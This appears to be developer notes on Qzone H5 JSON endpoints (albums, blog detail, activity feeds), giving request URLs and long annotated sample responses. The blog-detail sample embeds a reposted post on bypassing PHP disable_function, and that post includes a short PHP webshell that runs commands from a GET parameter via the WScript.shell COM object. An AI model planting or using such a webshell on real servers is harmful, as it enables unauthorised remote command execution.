"logo": "", "nickname": "xxxx", "stuStarInfo": &#123; "iStarLevel": 0, "iStarStatus": 0, "isAnnualVip": 0 &#125;, "uin": "好友QQ号码", "vip": 0 &#125; &#125; ... ], "num": 5 &#125;, "operation": &#123; // 操作相关 "busi_param": &#123; "16": "2", "18": "2", "184": "踏实一些，不要着急，你想要的，岁月都会给你。\nSteadfast some, don't try so hard, what you want, time will give you. ​​​​", "19": "QQ号码", "20": "d3498a1f2b97875ae9370b00", "23": "2", "30": "9", "5": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00", "6": "http://user.qzone.qq.com/QQ号码/mood/d3498a1f2b97875ae9370b00" &#125;, "share_info": &#123; "photo": &#123; "height": 580, "url": "http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0", "width": 580 &#125;, "summary": "来自QQ空间说说", "title": "踏实一些，不要着急，你想要的，岁月都会给你。..." &#125; &#125;, "pic": &#123; // 图片 "albumanswer": "", "albumid": "V144hICa2enRIy", // 相册ID "albumname": "", // 相册名称 "albumnum": 9, "albumquestion": "", // 相册描述 "albumrights": 0, "allow_access": 0, "anonymity": 0, "balbum": 0, "busi_param": null, "desc": "", "lastupdatetime": 0, // 最近一次更新时间 "picdata": &#123; "pic": [ &#123; "busi_param": &#123; "-1": "http://b353.photo.store.qq.com/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;bo=RAJEAgAAAAAAACY!", "144": "http://user.qzone.qq.com/QQ号码/photo/V144hICa2enRIy/NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!_quan", "35": "", "6": "http://user.qzone.qq.com/QQ号码/photo/V144hICa2enRIy/NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!" &#125;, "clientkey": "", "commentcount": 0, "desc": "", "isIndependentUgc": 0, "ismylike": 0, "lloc": "NDR000mKHy2Xh1rtn7s1YQEAAAAAAAA!", "opsynflag": 0, "photourl": &#123; "0": &#123; "height": 580, "url": "http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0", "width": 580 &#125;, "1": &#123; "height": 580, "url": "http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/b/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0", "width": 580 &#125;, "11": &#123; "height": 200, "url": "http://m.qpic.cn/psb?/V144hICa2enRIy/vJd.JnA1nTt0TUb*7Al*hK5HcwJNqRuEqTxgLw3MTiM!/m/dGEBAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=RAJEAgAAAAAAACY!&amp;tl=1&amp;su=0158128849&amp;vuin=QQ号码&amp;tm=1589274000#sce=30-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-311-0", "width": 200 &#125; &#125;, "picname": "", "shoottime": 0, "sloc": "", "type": 0, "uUploadTime": 0 &#125; ... ] &#125;, "picdata_index": 0, "uin": "0", "uploadnum": 9 &#125;, "summary": &#123; // 日志，说说,留言有该字段，但是也有可能没有该字段 "summary": "踏实一些，不要着急，你想要的，岁月都会给你。\nSteadfast some, don&amp;#39;t try so hard, what you want, time will give you. ​​​​" &#125;, "timeline": &#123; // 时间 "timestr": "2018/02/17" &#125;, "userinfo": &#123; // 发布用户 "user": &#123; "from": 1, "is_owner": 0, "level": 1, "logo": "", "nickname": "0x5f3759df", "stuStarInfo": &#123; "iStarLevel": 0, "iStarStatus": 0, "isAnnualVip": 0 &#125;, "uin": "QQ号码", "vip": 0 &#125; &#125; &#125; ] &#125;&#125; 获取相册详情 https://h5.qzone.qq.com/webapp/json/mqzone_photo/getPhotoList2?g_tk=1190425035&amp;uin=QQ号码&amp;albumid=相册ID&amp;ps=0&amp;pn=20&amp;password=&amp;password_cleartext=0&amp;swidth=1080&amp;sheight=1920 uid=当前用户QQ号码，albumid=相册ID, ps=页码，pn=页面大小 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248&#123; "ret": 0, "code": 0, "message": "", "data": &#123; "album": &#123; "uin": QQ号码, // 用户QQ "albumid": "相册ID", // 相册ID "name": "相册名称", // 相册名称 "desc": "", // 相册描述 "createtime": 1534254963, // 创建时间 "moditytime": 1558863208, // 更新时间 "lastuploadtime": 1534255181, // 上一次上传时间 "priv": 3, "total": 50, "question": "", "answer": "", "allow_share": 0, "album_white_list": [], "svrtime": 0, "busi_param": &#123;&#125;, "birth_time": 0, "type": 0, "isSubscribe": true, "opmask": 8196, "coverurl": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/m/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0",// 相册封面 "bitmap": "10010011", "birth_sexual": 0, "birth_nickname": "", "birth_year": 0, "birth_month": 0, "birth_day": 0, "birth_type": 0, "individual": 0, "material": &#123; "iItemId": 0, "iTypeId": 0, "iItemType": 0, "strItemName": "", "iExpireTime": 0, "vecFile": [], "strItemSummary": "", "strDescription": "", "stThumb": &#123; "iFileId": 0, "strName": "", "strUrl": "", "strMd5": "", "iSize": 0, "iFileType": 0, "iWidth": 0, "iHeight": 0 &#125;, "stBanner": &#123; "iFileId": 0, "strName": "", "strUrl": "", "strMd5": "", "iSize": 0, "iFileType": 0, "iWidth": 0, "iHeight": 0 &#125;, "uiSettleTime": 0, "strTraceInfo": "", "strDesignerInfo": "", "strExtFields": [], "mapExtInfo": &#123;&#125; &#125;, "albumowner": "QQ号码", "shareattrs": [], "is_share": 0, "owner": 0, "love_time": 0, "lover_events": [], "love_value": 0, "recoded_days": 0, "video_num": 0, "photo_num": 0 &#125;, "finish": 0,// 是否显示完成 1是 0没有 "list_count": 20, // pn大小 "total_count": 50,// 总共大小 "photos": &#123; // 相册 "1534176000": [ &#123; "1": &#123; "url": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/b/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=4wU4BAAAAAARF*o!&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0", // 原图 "width": 1507, "height": 1080, "focus_x": 753, "focus_y": 540, "enlarge_rate": 110 &#125;, "11": &#123; "url": "http://b304.photo.store.qq.com/psb?/相册ID/Zldsv*bLhSk.XwV2uChedWgDFH*wlyyQQo77uteBYJA!/m/dDABAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=4wU4BAAAAAARF*o!&amp;tl=1&amp;vuin=QQ号码&amp;tm=1589270400#sce=14-11-3&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-4-0", // 缩略图 "width": 279, "height": 200, "focus_x": 139, "focus_y": 100, "enlarge_rate": 110 &#125;, "picname": "中国结", // 相片名称 "sloc": "NDR000mKH03gclt1VgQdMAEAAAAAAAA!", "lloc": "NDR000mKH03gclt1VgQdMAEAAAAAAAA!", "type": 17, "ismylike": false, "likecount": 0, "commentcount": 0, "busi_param": &#123; "5": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!^||^http://user.qzone.qq.com/QQ号码/batchphoto/相册ID/1534255091137000^||^1", "6": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!", "7": "1", "21": "1534255091137000", "35": "", "144": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!_quan" &#125;, "clientkey": "", "isIndependentUgc": 0, "opsynflag": 32, "uUploadTime": 1534255181, "modifytime": 1534255181, "desc": "", "orglikekey": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!", "curlikekey": "http://user.qzone.qq.com/QQ号码/photo/相册ID/NDR000mKH03gclt1VgQdMAEAAAAAAAA!", "cropinfo": &#123; "centerx_scale": 50, "centery_scale": 50 &#125;, "uploadUin": 0, "shoottime": 1449560954, "flag": 0, "poi": &#123; "poi_id": "", "poi_x": "", "poi_y": "", "poi_name": "", "poi_address": "", "poi_type": 0, "region_name": "" &#125;, "facelist": [], "raw": 0, "isAutoPlayGif": false, "photoTag": [], "opmask": 39, "albumid": "相册ID", "piccategory": 0, "videoflag": 0, "videodata": &#123; "videoid": "", "videourl": "", "actiontype": 0, "actionurl": "", "clientkey": "", "filetype": 0, "videotype": 0, "videotime": 0, "videourls": &#123;&#125;, "playtype": 0, "videostatus": 0, "toast": "", "extendinfo": &#123;&#125;, "videoremark": &#123; "iconurl": "", "icondesc": "", "remark": "", "actiontype": 0, "actionurl": "", "orgwebsite": 0 &#125;, "video_show_type": 0, "isPanorama": false, "video_source": 1, "sloc": "", "lloc": "", "report_video_feeds_type": 0, "videoplaycnt": 0, "is_share": false, "adv_delay_time": 0, "video_webview_url": "", "isOnWifiPlay": false, "isHadSetPlayOnWifi": false &#125;, "isCoverPic": false, "pic_host_nick": &#123; "uin": QQ号码, "nick": "" &#125;, "luckyMoneyDesc": "", "geo": &#123; "poi_id": "", "poi_x": "", "poi_y": "", "poi_name": "", "poi_address": "", "poi_type": 0, "region_name": " " &#125;, "operation": &#123; "busi_param": &#123;&#125;, "weixin_url": "", "qq_url": "", "share_info": &#123; "title": "", "summary": "", "photourl": &#123;&#125; &#125;, "schema_info": &#123; "actiontype": 0, "actionurl": "", "downloadurl": "", "appid": "", "postparams": "", "usepost": 0, "schemapageurl": "", "appname": "", "loadingpage": false, "yingyongbao": true &#125;, "recomm_cookie": &#123;&#125;, "click_stream_report": &#123;&#125;, "qboss_trace": "", "custom_btn": [], "feed_report_cookie": &#123;&#125;, "generic_url": "", "bypass_param": &#123;&#125;, "droplist_cookie": &#123;&#125; &#125;, "musicdata": &#123; "musicid": "", "musicurl": "", "coverurl": "", "width": 0, "height": 0, "title": "", "musictime": 0, "musicMId": "", "musicType": "", "musicMUrl": "" &#125;, "audio_summary": "" &#125;, ... ] &#125; &#125;&#125; 获取日志详情 https://h5.qzone.qq.com/webapp/json/mqzone_detail/blog?g_tk=37401305&amp;appid=2&amp;uin=QQ号码&amp;refresh_type=1&amp;cellid=1552294923&amp;format=json (GET) cellid文章ID 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468&#123; "ret": 0, "code": 0, "message": "", "data": &#123; "cell_comm": &#123; "appid": 2, "subid": 0, "refer": "", "time": 1559532408, "actiontype": 0, "actionurl": "http://user.qzone.qq.com/QQ号码/blog/1559532408", "originaltype": 0, "operatemask": 321360011, "feedskey": "QQ号码_2_1559532408__1559532408", "orglikekey": "http://user.qzone.qq.com/QQ号码/blog/1559532408", "curlikekey": "http://user.qzone.qq.com/QQ号码/blog/1559532408", "feedstype": 0, "feedsattr": 0, "ugckey": "QQ号码_2_1559532408_", "clientkey": "", "show_mask": 0, "uflag": 0, "shield": 0, "ugcrightkey": "", "interestkey": "", "recomtype": 0, "feedsid": "", "adv_stytle": 0, "adv_subtype": 0, "right_info": &#123; "ugc_right": 1, "allow_uins": [] &#125;, "recomlayout": 0, "recomreportid": 0, "space_right": 0, "reportfeedsattr": 0, "recom_show_type": 0, "wup_feeds_type": 0, "stMapABTest": &#123;&#125;, "is_stay": false, "paykey": "201906030QQ号码1559532408", "operatemask2": 1612845056, "positionmask": 187827712, "positionmask2": 134217728, "editmask": 4294967295, "custom_droplist": [], "extendInfo": &#123; "blogHtml": "文章的富文本" &#125;, "feedsattr2": 0, "feedsDelTime": 0, "sqDynamicFeedsKey": "", "iClick_area": 0, "extendInfoData": &#123;&#125;, "hot_score": 0, "is_kuolie": false &#125;, "cell_userinfo": &#123; "user": &#123; "uin": QQ号码, "nickname": "__fy", "timestamp": 0, "from": 1, "uinkey": "", "logo": "", "vip": 0, "level": 0, "viplevel": 0, "viptype": 0, "qzonedesc": "", "is_owner": 0, "operation_mask": 0, "uid": "", "talk_id": "", "portrait_id": 0, "is_own": 0, "isFamousWhite": 0, "isQzoneUser": 0, "isAnnualVip": 0, "isSetNickGlint": 0, "medalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "descicon": "", "icon_width": 0, "icon_height": 0, "isSweetVip": 0, "stuStarInfo": &#123; "iStarStatus": 0, "iStarLevel": 0, "isAnnualVip": 0, "isHighStarVip": 0 &#125;, "stuCombineDiamondInfo": &#123; "iShowType": 0, "iVipLevel": 0, "isAnnualVip": 0, "isAnnualVipEver": 0 &#125;, "isSafeModeUser": 0, "vipShowType": 0, "namePlate": 0, "actiontype": 35, "actionurl": "", "decoration": [], "tagInfos": [], "strPortraitId": "", "under_nickname_desc": "", "liveshowMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "uFansCount": 0, "uVisitorCount": 0, "isCmtVerifyOpen": 0, "iCurUserType": 0, "displayflag": 0, "vtime": 0, "authqzoneMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "eUserTypeReport": 0, "iVipActType": 0, "openid_users": &#123; "openid": "", "nickname": "", "logo": "" &#125;, "sex": 0 &#125;, "action_desc": "原创日志", "actiontype": 5, "luckyMoneyPics": [] &#125;, "cell_id": &#123; "cellid": "1559532408", "subid": "" &#125;, "cell_title": &#123; "title": "PHP Webshell下绕过disable_function的方法", "titleurl": "http://user.qzone.qq.com/QQ号码/blog/1559532408", "userlist": [], "usernum": 0, "actiontype": 0, "user": &#123; "uin": 0, "nickname": "", "timestamp": 0, "from": 1, "uinkey": "", "logo": "", "vip": 0, "level": 0, "viplevel": 0, "viptype": 0, "qzonedesc": "", "is_owner": 0, "operation_mask": 0, "uid": "", "talk_id": "", "portrait_id": 0, "is_own": 0, "isFamousWhite": 0, "isQzoneUser": 0, "isAnnualVip": 0, "isSetNickGlint": 0, "medalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "descicon": "", "icon_width": 0, "icon_height": 0, "isSweetVip": 0, "stuStarInfo": &#123; "iStarStatus": 0, "iStarLevel": 0, "isAnnualVip": 0, "isHighStarVip": 0 &#125;, "stuCombineDiamondInfo": &#123; "iShowType": 0, "iVipLevel": 0, "isAnnualVip": 0, "isAnnualVipEver": 0 &#125;, "isSafeModeUser": 0, "vipShowType": -1, "namePlate": 0, "actiontype": 0, "actionurl": "", "decoration": [], "tagInfos": [], "strPortraitId": "", "under_nickname_desc": "", "liveshowMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "uFansCount": 0, "uVisitorCount": 0, "isCmtVerifyOpen": 0, "iCurUserType": 0, "displayflag": 0, "vtime": 0, "authqzoneMedalInfo": &#123; "medal_type": 0, "medal_state": 0, "level": 0, "pic_url": "", "jump_url": "" &#125;, "eUserTypeReport": 0, "iVipActType": 0, "openid_users": &#123; "openid": "", "nickname": "", "logo": "" &#125;, "sex": 0 &#125;, "useractiontype": 5, "relation_type": "", "status": 0, "talk_user_list": [], "relation": 0 &#125;, "hostDetail": &#123; "cell_detail_content": [ &#123; "cell_type": "cell_text", "data": &#123; "data": " \n系统组件绕过\n\nwindow com组件(php 5.4)(高版本扩展要自己添加）\n条件：要在php.ini中开启（如图）" &#125; &#125;, &#123; "cell_type": "cell_pic", "data": &#123; "picdata": &#123; "pic": [ &#123; "type": 3, "isAutoPlayGif": false, "photourl": &#123; "0": &#123; "url": "http://r.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/o/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 0, "size": 0, "md5": "" &#125;, "1": &#123; "url": "http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 0, "size": 0, "md5": "" &#125;, "11": &#123; "url": "http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=3QNXAd0DVwEDEDU!&amp;tl=1&amp;su=0184007825&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-11-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 0, "size": 0, "md5": "" &#125; &#125; &#125; ] &#125; &#125; &#125;, &#123; "cell_type": "cell_text", "data": &#123; "data": "\n\n\n利用代码，利用shell上传如下代码到目标服务器上\n&lt;?php\n $command=$_GET['a'];\n $wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能\n $exec = $wsh-&gt;exec(\"cmd /c \".$command); // 调用对象方法来执行命令\n $stdout = $exec-&gt;StdOut();\n $stroutput = $stdout-&gt;ReadAll();\n echo $stroutput;\n?&gt;\n利用成功后的结果" &#125; &#125;, &#123; "cell_type": "cell_pic", "data": &#123; "picdata": &#123; "pic": [ &#123; "type": 3, "isAutoPlayGif": false, "photourl": &#123; "0": &#123; "url": "http://r.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/o/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-0-0&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 623, "focus_x": 468, "focus_y": 311, "enlarge_rate": 0, "size": 0, "md5": "" &#125;, "1": &#123; "url": "http://b131.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/b/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-1-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 623, "focus_x": 468, "focus_y": 311, "enlarge_rate": 0, "size": 0, "md5": "" &#125;, "11": &#123; "url": "http://b131.photo.store.qq.com/psb?/相册ID/tiEcJmmwmkdnz28TDLpzZ8HppOvqgI7ghxlEFBy*Vqg!/b/dIMAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=qANvAqgDbwIDEDU!&amp;tl=1&amp;su=055860817&amp;vuin=QQ号码&amp;tm=1589274000#sce=63-11-1&amp;rf=v1_ht5_qz_3.4.0_001_idc_b-2-0", "width": 2100, "height": 623, "focus_x": 468, "focus_y": 311, "enlarge_rate": 0, "size": 0, "md5": "" &#125; &#125; &#125; ] &#125; &#125; &#125;, &#123; "cell_type": "cell_text", "data": &#123; "data": "\n\n\n\n原文地址:" &#125; &#125;, &#123; "cell_type": "cell_link", "data": &#123; "data": " https://xz.aliyun.com/t/5320", "url": "https://www.urlshare.cn/umirror_url_check?_wv=1&amp;srctype=touch&amp;apptype=3ghtml&amp;loginuin=QQ号码&amp;plateform=qzone&amp;url=https%3A%2F%2Fxz.aliyun.com%2Ft%2F5320&amp;src_uin=QQ号码&amp;src_scene=2&amp;cli_scene=getDetail" &#125; &#125; ] &#125;, "cell_operation": &#123; "busi_param": &#123; "4": "PHP Webshell下绕过disable_function的方法", "16": "0", "30": "0", "47": "0" &#125;, "weixin_url": "", "qq_url": "", "share_info": &#123; "title": "PHP Webshell下绕过disable_function的方法", "summary": "系统组件绕过window com组件(php 5.4)(高版本扩展要自己添加）条件：要在php.ini中开启（如图）[图片]利用代码，利用shell上传如下代码到目标服务器上&lt;?php $command=$_GET['a']; $wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能 $exec = $wsh-&gt;exec(\"cmd /c \".$command); // 调用对象方法来执行命令 $stdout = $exec-&gt;StdOut(); $stroutput = $stdout-&gt;ReadAll(); echo $stroutput;?&gt;利用成功后的结果[图片]原文地址: https://xz.aliyun.com/t/5320", "photourl": &#123; "0": &#123; "url": "http://r.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/o/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!", "width": 989, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 200, "size": 0, "md5": "" &#125;, "1": &#123; "url": "http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!", "width": 989, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 200, "size": 0, "md5": "" &#125;, "11": &#123; "url": "http://b182.photo.store.qq.com/psb?/相册ID/8qomvegWFxQZiyoyhRiq*HgGKxYpEdMi59.wcWGer4Y!/b/dLYAAAAAAAAA&amp;bo=3QNXAd0DVwEDEDU!", "width": 989, "height": 343, "focus_x": 494, "focus_y": 171, "enlarge_rate": 200, "size": 0, "md5": "" &#125; &#125;, "ark_sharedata": &#123; "ark_id": "", "view_id": "", "ark_content": "" &#125;, "action_url": "" &#125;, "schema_info": &#123; "actiontype": 0, "actionurl": "", "downloadurl": "", "appid": "", "postparams": "", "usepost": 0, "schemapageurl": "", "appname": "", "loadingpage": false, "yingyongbao": true, "master_actionurl": "" &#125;, "recomm_cookie": &#123;&#125;, "click_stream_report": &#123;&#125;, "qboss_trace": "", "custom_btn": [], "feed_report_cookie": &#123; "1": "16842752", "3": "QQ号码_2_" &#125;, "generic_url": "", "bypass_param": &#123;&#125;, "droplist_cookie": &#123;&#125;, "rank_param": &#123;&#125;, "button_gif_url": "", "offline_resource_bid": 0 &#125;, "cell_visitor": &#123; "view_count": 1, "visitor_count": 0, "visitors": [], "mod": 0, "view_count_byfriends": 0, "myfriend_info": "" &#125;, "cell_header": &#123; "type": 0, "tih_year": 0 &#125;, "cell_forward_list": &#123; "num": 0, "isforward": 0, "fwdmans": [], "actionUrl": "https://h5.qzone.qq.com/forward/list/http%3A%2F%2Fuser.qzone.qq.com%2FQQ号码%2Fblog%2F1559532408_forward/QQ号码/forwardlist?_wv=2098179&amp;_proxy=1", "extendinfo": &#123;&#125;, "forwardkey": "http://user.qzone.qq.com/QQ号码/blog/1559532408_forward" &#125;, "attach_info": "", "hasmore": 0 &#125;&#125; 获取活跃动态 https://h5.qzone.qq.com/webapp/json/mqzone_feeds/getActiveFeeds?g_tk=见ptqrtoken生成算法(POST) res_attach: back_server_info=basetime%3D1588493186%26pagenum%3D4%26dayvalue%3D3%26getadvlast%3D0%26hasgetadv%3D%26lastentertime%3D1589276428%26LastAdvPos%3D0%26UnReadCount%3D0%26UnReadSum%3D0%26LastIsADV%3D0%26UpdatedFollowUins%3D%26UpdatedFollowCount%3D0%26LastRecomBrandID%3D%26gatewayAttach%3D&amp;lastrefreshtime=1589276431&amp;lastseparatortime=0&amp;loadcount=2&amp;refresh_session=QQ号码_1589276431 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739740741742743744745746747748749750751752753754755756757758759760761762763764765766767768769770771&#123; "ret": 0, "code": 0, "message": "", "data": &#123; "attachinfo": "", "hasmore": 1, "newcnt": 0, "undeal_info": &#123; "active_cnt": 0, "passive_cnt": 0, "gamebar_cnt": 0, "gift_cnt": 0, "visitor_cnt": 0 &#125;, "vFeeds": [ &#123; "comm": &#123; "appid": 311, "subid": 0, "refer": "", "time": 1588947653, "actiontype": 0, "actionurl": "", "originaltype": 0, "operatemask": 491531, "feedskey": "311_0_386661396431323063363661623535653061633430303030", "orglikekey": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000", "curlikekey": "http://user.qzone.qq.com/评论好友QQ/mood/8fa9d120c66ab55e0ac40000", "feedstype": 0, "feedsattr": 0, "ugckey": "评论好友QQ_311_8fa9d120c66ab55e0ac40000_", "clientkey": "", "show_mask": 0, "uflag": 0, "shield": 0, "ugcrightkey": "8fa9d120c66ab55e0ac40000", "interestkey": "", "recomtype": 0, "feedsid": "", "adv_stytle": 0, "adv_subtype": 0, "right_info": &#123; "ugc_right": 1, "allow_uins": [] &#125;, "recomlayout": 0, "recomreportid": 0, "space_right": 0, "reportfeedsattr": 5, "recom_show_type": 0, "wup_feeds_type": 100, "stMapABTest": &#123;&#125;, "is_stay": false, "paykey": "", "operatemask2": 2752512, "positionmask": 0, "positionmask2": 0, "editmask": 4294967295, "custom_droplist": [], "extendInfo": &#123; "_func_type": "func_friend_feed", "is_feeds_long_pics_browsing_mode": "0", "srcappid": "" &#125;, "feedsattr2": 0, "feedsDelTime": 0, "sqDynamicFeedsKey": "评论好友QQ_1588947653_311_0_8fa9d120c66ab55e0ac40000", "iClick_area": 0, "extendInfoData": &#123;&#125;, "hot_score": 0, "is_kuolie": false &#125;, "userinfo": &#123; // 发布人 "user": &#123; "uin": 评论好友QQ, "nickname": "儒雅的悟空", "timestamp": 1588947653, "from": 1, "uinkey": "", "logo": "", "vip": 0, "level": 1, "viplevel": 1, "viptype": 0, "qzonedesc": "", "is_owner": 0, "operation_mask": 0, "uid": "", "talk_id": "", "portrait_id": 0, 